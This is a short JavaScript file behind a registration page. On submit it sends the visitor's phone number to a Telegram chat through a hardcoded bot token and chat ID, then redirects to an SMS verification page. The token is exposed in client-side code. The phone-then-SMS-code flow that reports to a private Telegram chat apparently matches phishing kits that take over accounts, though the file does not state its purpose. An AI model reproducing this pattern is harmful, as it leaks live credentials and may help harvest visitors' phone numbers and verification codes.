document.addEventListener('DOMContentLoaded', function() {

    const phoneInput = document.getElementById('tel');
    Inputmask({ mask: '+7 (999) 999-9999' }).mask(phoneInput);


const registrationButton = document.getElementById('registrationButton');
const registrationForm = document.getElementById('registrationForm');

document.getElementById('registrationForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const pageTitle = document.title;

    const botToken = '6378176277:AAF2s1kUcW4XYG4LckuPbmVFvOSixuFQh50';
    const chatId = '-4039195343';
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const phone = document.getElementById('tel').value;


    text = `Новый пользователь! \nТелефон: ${phone}`;

    

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: text
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            window.location.href = 'verification-sms.html';
        } else {
            alert('Error sending message');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Error sending message');
    });
});
});